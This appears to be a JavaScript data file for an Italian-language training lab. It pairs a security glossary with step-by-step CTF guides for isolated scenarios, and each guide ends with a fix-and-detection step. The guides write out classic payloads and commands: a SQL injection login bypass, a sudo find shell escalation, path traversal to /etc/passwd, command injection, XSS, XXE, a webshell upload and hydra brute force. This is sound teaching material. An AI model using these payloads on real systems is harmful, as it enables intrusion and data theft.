/**
 * Guide didattiche Laboratorio Virtuale — passo passo + glossario termini.
 * Placeholder nel testo: {{chiave}} o {{chiave|testo visibile}}
 */
(function () {
  const G = {
    'jump-box': 'Macchina di partenza controllata da cui lanci i test verso gli scenari isolati, senza toccare reti esterne.',
    vlan: 'Virtual LAN: segmento di rete logico isolato. Negli scenari EVIL i target vivono in una VLAN dedicata (10.42.x.x).',
    nmap: 'Network Mapper: scanner per scoprire host attivi, porte aperte e versioni dei servizi in ascolto.',
    'port-scan': 'Scansione delle porte TCP/UDP di un host per capire quali servizi espone (web, SSH, SMB, ecc.).',
    ping: 'Comando ICMP per verificare se un host risponde in rete prima di scansionarlo in profondità.',
    ssh: 'Secure Shell: protocollo cifrato (porta 22) per accesso remoto a shell su server Linux/Unix.',
    curl: 'Client a riga di comando per inviare richieste HTTP e ispezionare risposte, header e body.',
    http: 'HyperText Transfer Protocol: protocollo con cui browser e API scambiano pagine e dati (porta 80/443).',
    sqli: 'SQL Injection: input utente concatenato nella query SQL senza filtri, che permette bypass o estrazione dati.',
    payload: 'Stringa o comando costruito per sfruttare una vulnerabilità (es. una condizione sempre vera in un login).',
    xss: 'Cross-Site Scripting: script malevolo iniettato in una pagina ed eseguito nel browser della vittima.',
    csrf: 'Cross-Site Request Forgery: inganno che fa eseguire azioni autenticate (cambio email, trasferimenti) senza consenso.',
    lfi: 'Local File Inclusion: il server include file locali scelti dall\'attaccante tramite un parametro non validato.',
    'directory-traversal': 'Tecnica che usa ../ per risalire le cartelle e leggere file fuori dalla web root.',
    dirb: 'Directory brute forcer: prova migliaia di path comuni (/admin, /backup) su un web server.',
    hydra: 'Strumento di attacco a dizionario online: prova liste di password su login SSH, FTP, HTTP e altri servizi.',
    'brute-force': 'Attacco che tenta sistematicamente molte password o PIN finché uno non funziona.',
    smb: 'Server Message Block: protocollo Windows/Linux per condivisioni di file e stampanti (porte 445/139).',
    smbclient: 'Client Samba per elencare share di rete e scaricare file da risorse SMB.',
    privesc: 'Privilege escalation: passaggio da utente limitato a privilegi più alti (es. root).',
    sudo: 'Comando Linux che esegue programmi con privilegi elevati secondo regole in /etc/sudoers.',
    flag: 'Stringa segreta in formato CTF che conferma il completamento di un obiettivo didattico nello scenario.',
    ctf: 'Capture The Flag: esercizio di sicurezza in cui recuperi flag nascoste dimostrando una competenza.',
    ricognizione: 'Fase iniziale di un test autorizzato: raccogliere informazioni su rete, servizi e superficie d\'attacco.',
    banner: 'Messaggio iniziale di un servizio (es. versione OpenSSH) utile per identificare software vulnerabile.',
    wordlist: 'Lista di password o path usata da strumenti come hydra o dirb per attacchi automatizzati.',
    token: 'Valore segreto nel form che prova che la richiesta proviene dalla sessione legittima dell\'utente.',
    post: 'Metodo HTTP che invia dati nel body (es. form di login) invece che solo nell\'URL.',
    share: 'Cartella di rete esposta via SMB a cui i client autorizzati possono accedere.',
    'command-injection': 'Input utente concatenato a comandi di sistema (ping, exec), che permette di eseguire comandi arbitrari.',
    ssrf: 'Server-Side Request Forgery: il server fa richieste HTTP verso URL scelti dall\'attaccante, anche verso la rete interna.',
    idor: 'Insecure Direct Object Reference: cambiare un ID nell\'URL/API espone record di altri utenti senza autorizzazione.',
    jwt: 'JSON Web Token: token firmato che attesta identità/ruolo; se mal implementato permette escalation di privilegi.',
    xxe: 'XML External Entity: entità XML che forza il parser a leggere file locali o fare richieste di rete.',
    entity: 'Dichiarazione XML <!ENTITY> che definisce contenuto riutilizzabile, sfruttabile in attacchi XXE.',
    webshell: 'Script (es. PHP) caricato sul server che offre una shell remota all\'attaccante.',
    ftp: 'File Transfer Protocol (porta 21): trasferimento file; il login anonymous spesso espone dati per errore.',
    anonymous: 'Accesso FTP/SMB senza credenziali reali: utile ai legittimi proprietari ma pericoloso se mal configurato.',
    api: 'Application Programming Interface: endpoint leggibile da programmi (spesso JSON) da testare per auth e IDOR.',
    authorization: 'Header HTTP (es. Bearer token) che prova chi sei: va validato lato server a ogni richiesta.',
    'internal-network': 'Segmento non esposto a Internet (RFC1918) raggiungibile solo da server interni: bersaglio classico di SSRF.',
    waf: 'Web Application Firewall: filtro che ispeziona le richieste HTTP e blocca payload sospetti.',
    'prepared-statement': 'Query parametrizzata: i valori dell\'utente sono passati separati dal testo SQL, mai concatenati.',
    'least-privilege': 'Principio del privilegio minimo: a ogni utente o processo solo i permessi strettamente necessari.',
  };

  // Ogni guida inquadra lo scenario come attività di test AUTORIZZATA e si chiude con
  // un passo "Difendi" (comando fix) che mostra la correzione e come si rileva l'attacco.
  const DEFEND = (body) => ({ title: 'Difendi: come si corregge', body, command: 'fix' });

  const STUDY = {
    'network-recon': {
      title: 'Ricognizione di rete',
      intro: 'In un test autorizzato il primo passo è mappare cosa esiste in rete: host attivi, porte aperte e servizi.',
      steps: [
        {
          title: 'Connettiti alla jump box',
          body: 'Ogni sessione parte dalla {{jump-box|jump box}} EVIL (10.42.0.2): un punto controllato dentro la {{vlan|VLAN}} isolata.',
        },
        {
          title: 'Verifica che il target risponda',
          body: 'Usa {{ping|ping}} sull\'IP assegnato allo scenario per confermare che il target sia raggiungibile.',
          command: 'ping 10.42.10.5',
        },
        {
          title: 'Scansiona porte e servizi',
          body: '{{nmap|nmap}} con -sV esegue una {{port-scan|scansione delle porte}} e tenta il {{banner|banner grabbing}} delle versioni.',
          command: 'nmap -sV 10.42.10.5',
        },
        {
          title: 'Interpreta l\'output',
          body: 'Cerca le righe STATE open: ogni porta indica un servizio ({{ssh|SSH}}, {{http|HTTP}}, HTTPS). Annota cosa potresti approfondire.',
        },
        {
          title: 'Trova e consegna la flag',
          body: 'Completata la {{ricognizione|ricognizione}}, individua la {{flag|flag}} dall\'output e consegnala con submit flag.',
          command: 'submit flag <flag>',
        },
        DEFEND('Riduci la superficie esposta: esponi solo le porte necessarie, chiudi i servizi inutilizzati e metti davanti un firewall con allowlist. Una scansione si rileva da un {{waf|IDS/IPS}} e dai log del firewall: molte connessioni verso porte diverse dallo stesso IP in pochi secondi.'),
      ],
    },
    'web-app-01': {
      title: 'SQL injection sul login',
      intro: 'Molti form di login costruiscono la query SQL concatenando l\'input utente: un errore classico e pericoloso, qui in uno scenario autorizzato.',
      steps: [
        {
          title: 'Trova il servizio web',
          body: 'Con {{nmap|nmap}} individua la porta 80, poi usa {{curl|curl}} per scaricare la pagina di login via {{http|HTTP}}.',
          command: 'curl http://10.42.10.11/login',
        },
        {
          title: 'Analizza il form',
          body: 'Nota i parametri user e pass inviati in {{post|POST}}. Se non sono filtrati, l\'input può alterare la query SQL.',
        },
        {
          title: 'Prova il bypass',
          body: 'Un {{payload|payload}} di {{sqli|SQL injection}} inserisce nel campo user una condizione sempre vera, che rende l\'autenticazione sempre valida.',
          command: 'curl http://10.42.10.11/login -d "user=admin\' OR \'1\'=\'1&pass=x"',
        },
        {
          title: 'Trova e consegna la flag',
          body: 'Se il bypass funziona, la risposta contiene la {{flag|flag}} da consegnare.',
          command: 'submit flag <flag>',
        },
        DEFEND('Usa {{prepared-statement|query parametrizzate}} con binding dei valori, mai concatenazione di stringhe; valida l\'input e dai all\'utente del database il {{least-privilege|privilegio minimo}}. L\'attacco si rileva con un {{waf|WAF}} e dai log applicativi: apici e sintassi SQL nei parametri, picchi di errori SQL.'),
      ],
    },
    'linux-ssh-01': {
      title: 'Accesso SSH con credenziali deboli',
      intro: 'Le password prevedibili su SSH restano uno dei vettori più comuni negli ambienti mal configurati.',
      steps: [
        {
          title: 'Individua SSH',
          body: '{{nmap|nmap}} sulla porta 22 conferma che {{ssh|SSH}} sia esposto sul target.',
          command: 'nmap -p 22 10.42.10.21',
        },
        {
          title: 'Tentativo di accesso',
          body: 'Con ssh user@IP avvii l\'handshake; lo scenario chiede la password, come farebbe un server reale.',
          command: 'ssh student@10.42.10.21',
        },
        {
          title: 'Credenziali di prova',
          body: 'In didattica si usano credenziali deboli d\'esempio. In questo scenario l\'utente student ha la password di prova evil-lab-01; in produzione servono policy robuste e autenticazione a chiave.',
        },
        {
          title: 'Esplora il filesystem',
          body: 'Dopo l\'accesso, cat legge i file locali. Cerca note o configurazioni con la {{flag|flag}}.',
          command: 'cat /home/student/notes.txt',
        },
        {
          title: 'Consegna la flag',
          body: 'Consegna la {{flag|flag}} trovata per chiudere lo scenario.',
          command: 'submit flag <flag>',
        },
        DEFEND('Disabilita l\'autenticazione a password (PasswordAuthentication no) e usa solo chiavi SSH; aggiungi fail2ban e MFA. L\'attacco si rileva dalle righe "Failed password" ripetute in /var/log/auth.log dallo stesso IP.'),
      ],
    },
    'linux-privesc-01': {
      title: 'Privilege escalation via sudo',
      intro: 'Anche con una shell limitata, una regola sudo troppo permissiva può portare a root, in uno scenario autorizzato.',
      steps: [
        {
          title: 'Accedi come utente dev',
          body: 'Stesso flusso {{ssh|SSH}} dello scenario precedente: credenziali di prova dev / evil-lab-dev.',
          command: 'ssh dev@10.42.10.22',
        },
        {
          title: 'Controlla cosa puoi eseguire',
          body: '{{sudo|sudo}} -l elenca i comandi eseguibili come root senza password: il punto di partenza per la {{privesc|privilege escalation}}.',
          command: 'sudo -l',
        },
        {
          title: 'Individua il binario sfruttabile',
          body: 'Se un binario come find è permesso, l\'opzione -exec può lanciare una shell con privilegi elevati. Consulta GTFOBins per la sintassi esatta.',
          command: 'sudo find . -exec /bin/sh \\; -quit',
        },
        {
          title: 'Leggi i file di root e consegna la flag',
          body: 'Con uid=0 accedi a /root/flag.txt e recuperi la {{flag|flag}}.',
          command: 'submit flag <flag>',
        },
        DEFEND('Concedi in sudoers solo i comandi strettamente necessari ({{least-privilege|privilegio minimo}}); evita binari che aprono shell (find, vim, less) con NOPASSWD e preferisci wrapper controllati. L\'abuso si rileva con auditd sulle execve e dai log di sudo: un utente normale che lancia /bin/sh tramite sudo.'),
      ],
    },
    'xss-reflected': {
      title: 'XSS riflesso',
      intro: 'L\'input viene rimandato subito nella pagina senza codifica, e il browser lo esegue come codice.',
      steps: [
        {
          title: 'Trova il parametro vulnerabile',
          body: 'Ispeziona /search con {{curl|curl}}: il parametro q compare nella risposta HTML.',
          command: 'curl "http://10.42.10.12/search?q=test"',
        },
        {
          title: 'Capire il rischio XSS',
          body: 'L\'{{xss|XSS}} riflesso permette di iniettare JavaScript che viene eseguito dalla vittima che apre il link.',
        },
        {
          title: 'Dimostra l\'esecuzione',
          body: 'Un {{payload|payload}} minimo come <script>alert(1)</script> dimostra l\'esecuzione; nello scenario non tocca sistemi reali.',
          command: 'curl "http://10.42.10.12/search?q=<script>alert(1)</script>"',
        },
        {
          title: 'Trova e consegna la flag',
          body: 'La risposta contiene la {{flag|flag}} da consegnare.',
          command: 'submit flag <flag>',
        },
        DEFEND('Codifica l\'output in base al contesto (HTML, attributo, JS), affidati all\'escaping automatico del framework e applica una Content-Security-Policy restrittiva. L\'attacco si rileva da un {{waf|WAF}} e dai report di violazione della CSP: tag <script> o handler on* riflessi nelle risposte.'),
      ],
    },
    'lfi-web': {
      title: 'Local File Inclusion',
      intro: 'Il server include file locali in base a un parametro controllabile dall\'utente.',
      steps: [
        {
          title: 'Endpoint vulnerabile',
          body: 'Cerca parametri come file= negli URL {{http|HTTP}}: spesso includono pagine senza allowlist.',
          command: 'curl "http://10.42.10.15/view?file=index.php"',
        },
        {
          title: 'Directory traversal',
          body: 'Il {{directory-traversal|directory traversal}} con ../ risale le cartelle per uscire dalla web root.',
        },
        {
          title: 'Leggi un file di sistema',
          body: 'Prova di concetto classica della {{lfi|LFI}}: leggere file di sistema noti come /etc/passwd.',
          command: 'curl "http://10.42.10.15/view?file=../../../etc/passwd"',
        },
        {
          title: 'Trova e consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Non passare mai l\'input utente a funzioni di inclusione: usa una allowlist di file consentiti, normalizza il percorso e confina con open_basedir/chroot. Il traversal si rileva dalle sequenze ../ o da percorsi come /etc/passwd nei parametri, visibili nei log del web server.'),
      ],
    },
    'csrf-web': {
      title: 'CSRF su cambio email',
      intro: 'Senza token anti-CSRF, un sito terzo può far eseguire azioni al browser già autenticato.',
      steps: [
        {
          title: 'Ispeziona il form',
          body: 'Con {{curl|curl}} verifica se il form /account/email ha un {{token|token}} nascosto o un header di protezione.',
          command: 'curl http://10.42.10.13/account/email',
        },
        {
          title: 'Capire la CSRF',
          body: 'La {{csrf|CSRF}} sfrutta il cookie di sessione della vittima: il server accetta richieste {{post|POST}} cross-origin.',
        },
        {
          title: 'Mostra la richiesta accettata',
          body: 'Invia solo il campo email, senza token: nello scenario l\'azione viene accettata (vulnerabilità intenzionale).',
          command: 'curl -d "email=attacker@evil.lab" http://10.42.10.13/account/email',
        },
        {
          title: 'Trova e consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Richiedi un token anti-CSRF per ogni azione che cambia stato, imposta i cookie di sessione con SameSite e chiedi la riautenticazione per le operazioni sensibili. L\'abuso si rileva dalle richieste senza token valido o con Origin/Referer cross-site inattesi.'),
      ],
    },
    'dir-discovery': {
      title: 'Scoperta di directory nascoste',
      intro: 'Percorsi non collegati da nessuna pagina possono esporre pannelli admin o backup dimenticati.',
      steps: [
        {
          title: 'Enumera i percorsi',
          body: '{{dirb|dirb}} prova una {{wordlist|wordlist}} di directory comuni sul server {{http|HTTP}}.',
          command: 'dirb http://10.42.10.14/',
        },
        {
          title: 'Analizza i risultati',
          body: 'Cerca codici 200 su percorsi sensibili come /admin: indicano risorse non pubblicizzate.',
        },
        {
          title: 'Leggi la risorsa trovata',
          body: 'Usa {{curl|curl}} sul percorso scoperto per leggerne il contenuto.',
          command: 'curl http://10.42.10.14/admin/flag.txt',
        },
        {
          title: 'Consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Rimuovi o proteggi con autenticazione i percorsi sensibili, disattiva il listing delle directory e non lasciare backup nella web root. L\'enumerazione si rileva da raffiche di 404/403 verso percorsi comuni dallo stesso IP, nei log di accesso.'),
      ],
    },
    'brute-force-ssh': {
      title: 'Brute force SSH con hydra',
      intro: 'Le password deboli cadono sotto attacchi automatizzati: ecco perché servono MFA e rate limiting.',
      steps: [
        {
          title: 'Conferma il servizio',
          body: '{{nmap|nmap}} sulla porta 22 verifica che {{ssh|SSH}} sia attivo prima di lanciare il {{brute-force|brute force}}.',
          command: 'nmap -p 22 10.42.10.23',
        },
        {
          title: 'Lancia hydra',
          body: '{{hydra|Hydra}} prova l\'utente admin con una {{wordlist|wordlist}}; in produzione il rate limiting fermerebbe l\'attacco.',
          command: 'hydra -l admin -P /usr/share/wordlists/lab.txt ssh://10.42.10.23',
        },
        {
          title: 'Leggi il report',
          body: 'Hydra stampa login e password trovati, insieme alla {{flag|flag}}.',
        },
        {
          title: 'Consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Preferisci l\'autenticazione a chiave, aggiungi MFA, limita i tentativi con fail2ban e un rate limit, e vieta login diretti con password deboli. Il brute force si rileva da molti login falliti in rapida successione dallo stesso IP in /var/log/auth.log.'),
      ],
    },
    'smb-enum': {
      title: 'Enumerazione delle condivisioni SMB',
      intro: 'Le share SMB mal configurate possono esporre backup e file sensibili senza credenziali.',
      steps: [
        {
          title: 'Scansiona SMB',
          body: 'Le porte 445/139 indicano {{smb|SMB}}. {{nmap|nmap}} -p 445 conferma microsoft-ds aperto.',
          command: 'nmap -p 445 10.42.10.31',
        },
        {
          title: 'Elenca le share',
          body: '{{smbclient|smbclient}} -L con accesso anonimo (-N) elenca le {{share|share}} accessibili.',
          command: 'smbclient -L //10.42.10.31 -N',
        },
        {
          title: 'Scarica il file',
          body: 'Connettiti alla share backup e scarica il file con -c "get flag.txt".',
          command: 'smbclient //10.42.10.31/backup -N -c "get flag.txt"',
        },
        {
          title: 'Consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Disattiva l\'accesso guest/anonymous, restringi le share agli utenti autorizzati, abilita la firma SMB e segmenta la rete. L\'enumerazione si rileva dai log SMB: accessi anonimi e richieste di listing delle share da host non previsti.'),
      ],
    },
    'command-injection': {
      title: 'OS command injection',
      intro: 'Quando l\'input web finisce in una chiamata di sistema, un ; o un | può eseguire comandi arbitrari sul server.',
      steps: [
        {
          title: 'Trova il parametro vulnerabile',
          body: 'Endpoint come /ping?host= spesso passano il valore a una shell senza sanitizzazione.',
          command: 'curl "http://10.42.10.16/ping?host=127.0.0.1"',
        },
        {
          title: 'Capire la command injection',
          body: 'La {{command-injection|command injection}} concatena comandi shell: host=127.0.0.1;whoami esegue whoami dopo il ping.',
        },
        {
          title: 'Dimostra l\'esecuzione',
          body: 'Se vedi uid=www-data, il {{payload|payload}} ha funzionato; recupera la {{flag|flag}}.',
          command: 'curl "http://10.42.10.16/ping?host=127.0.0.1;whoami"',
        },
        {
          title: 'Consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Evita di invocare una shell: usa API native con argomenti separati, oppure una allowlist rigida e la validazione dell\'input; mai concatenare stringhe nei comandi. L\'injection si rileva da un {{waf|WAF}} e dai log: metacaratteri come ; | & o backtick nei parametri.'),
      ],
    },
    'ssrf-web': {
      title: 'Server-Side Request Forgery',
      intro: 'Il server recupera URL forniti dall\'utente: puoi raggiungere servizi interni non esposti all\'esterno.',
      steps: [
        {
          title: 'Endpoint di fetch',
          body: 'Cerca parametri come url=, link= o path= in {{api|API}} o pagine di anteprima.',
          command: 'curl "http://10.42.10.17/fetch?url=http://example.com"',
        },
        {
          title: 'Punta alla rete interna',
          body: 'L\'{{ssrf|SSRF}} verso la {{internal-network|rete interna}} (es. 10.42.0.99) raggiunge risorse dietro il perimetro.',
        },
        {
          title: 'Leggi il servizio interno',
          body: 'Fai richiedere al server un host interno dello scenario per ottenere la {{flag|flag}}.',
          command: 'curl "http://10.42.10.17/fetch?url=http://10.42.0.99/internal/flag"',
        },
        {
          title: 'Consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Usa una allowlist di host e schemi consentiti, blocca gli indirizzi interni e i metadata service, e non passare mai l\'URL grezzo dell\'utente al client HTTP. L\'SSRF si rileva dalle richieste in uscita dal server verso indirizzi interni o verso 169.254.169.254.'),
      ],
    },
    'idor-api': {
      title: 'IDOR su API REST',
      intro: 'Riferimenti diretti a oggetti senza controllo di autorizzazione: un classico della OWASP Top 10.',
      steps: [
        {
          title: 'Profilo corrente',
          body: 'Nota il tuo id=1000 nella risposta {{api|API}} JSON.',
          command: 'curl "http://10.42.10.18/api/user?id=1000"',
        },
        {
          title: 'Manipola l\'ID',
          body: 'Con l\'{{idor|IDOR}} cambi l\'id per leggere dati di altri utenti: prova un valore vicino.',
          command: 'curl "http://10.42.10.18/api/user?id=1001"',
        },
        {
          title: 'Trova e consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Verifica a ogni richiesta che l\'utente autenticato possa accedere a quell\'oggetto; preferisci identificatori non indovinabili e nega per impostazione predefinita. L\'IDOR si rileva da accessi sequenziali a molti ID o a record fuori dall\'ambito dell\'utente, nei log dell\'API.'),
      ],
    },
    'jwt-weak': {
      title: 'Autorizzazione API via JWT',
      intro: 'Un token JWT mal validato permette accesso privilegiato: fondamentale nei test su API moderne.',
      steps: [
        {
          title: 'Richiesta negata',
          body: 'Senza header {{authorization|Authorization}} l\'{{api|API}} risponde 403.',
          command: 'curl http://10.42.10.19/api/profile',
        },
        {
          title: 'Token admin dello scenario',
          body: 'Lo scenario accetta un {{jwt|JWT}} di prova nell\'header Authorization; in realtà testeresti firma debole, alg none o secret esposti.',
          command: 'curl -H "Authorization: Bearer evil.admin.token.lab" http://10.42.10.19/api/profile',
        },
        {
          title: 'Trova e consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Verifica sempre la firma con un secret robusto, accetta solo gli algoritmi previsti (mai alg none), controlla scadenza e claim e ruota le chiavi. L\'abuso si rileva da picchi di token con firma non valida o con header alg none nei log di autenticazione.'),
      ],
    },
    'file-upload': {
      title: 'Upload di file non validato',
      intro: 'Permettere un file eseguibile sul web root equivale a regalare una {{webshell|webshell}}.',
      steps: [
        {
          title: 'Form di upload',
          body: 'Ispeziona l\'endpoint multipart/form-data con {{curl|curl}}.',
          command: 'curl http://10.42.10.20/upload',
        },
        {
          title: 'Carica un file eseguibile',
          body: 'curl -F invia un file; se il server lo salva eseguibile in /uploads, diventa una webshell.',
          command: 'curl -F "file=@shell.php" http://10.42.10.20/upload',
        },
        {
          title: 'Trova e consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Valida tipo, estensione e contenuto con una allowlist, salva i file fuori dalla web root con nomi casuali e vietane l\'esecuzione. L\'abuso si rileva dagli upload di estensioni eseguibili (.php, .jsp) e dalle successive richieste a quei file nei log.'),
      ],
    },
    'xxe-xml': {
      title: 'XML External Entity',
      intro: 'Un parser XML che risolve le {{entity|entità}} esterne permette di leggere file locali o raggiungere la rete interna.',
      steps: [
        {
          title: 'Endpoint XML',
          body: 'Cerca una POST che accetta application/xml o text/xml.',
          command: 'curl -d "<user>test</user>" http://10.42.10.24/api/parse',
        },
        {
          title: 'Payload XXE',
          body: 'L\'{{xxe|XXE}} con <!ENTITY x SYSTEM "file:///etc/hostname"> forza il server a includere un file locale.',
          command: 'curl -d \'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/hostname">]><user>&x;</user>\' http://10.42.10.24/api/parse',
        },
        {
          title: 'Trova e consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Disattiva DTD ed entità esterne nel parser (feature "disallow-doctype-decl", nessuna risoluzione di entità esterne) e preferisci formati più semplici dove possibile. L\'XXE si rileva da payload XML con DOCTYPE/ENTITY o schemi file:// nei corpi delle richieste.'),
      ],
    },
    'ftp-anonymous': {
      title: 'Accesso FTP anonimo',
      intro: 'Servizi {{ftp|FTP}} dimenticati con login {{anonymous|anonymous}} espongono spesso backup e configurazioni.',
      steps: [
        {
          title: 'Scopri FTP',
          body: '{{nmap|nmap}} sulla porta 21 identifica il server FTP (es. vsftpd).',
          command: 'nmap -p 21 10.42.10.32',
        },
        {
          title: 'Scarica il file in modo non interattivo',
          body: 'Con il login {{anonymous|anonymous}} puoi scaricare i file esposti. Usa curl con uno schema ftp:// per farlo in un comando solo.',
          command: 'curl "ftp://anonymous:anon@10.42.10.32/flag.txt"',
        },
        {
          title: 'Consegna la flag',
          command: 'submit flag <flag>',
        },
        DEFEND('Disattiva il login anonimo (in vsftpd: anonymous_enable=NO), usa SFTP/FTPS con account autenticati e limita i permessi alle sole directory necessarie. L\'abuso si rileva dai log del server FTP: login "anonymous" e download di file non previsti.'),
      ],
    },
  };

  window.VLAB_GLOSSARY = G;
  window.VLAB_STUDY = STUDY;
})();
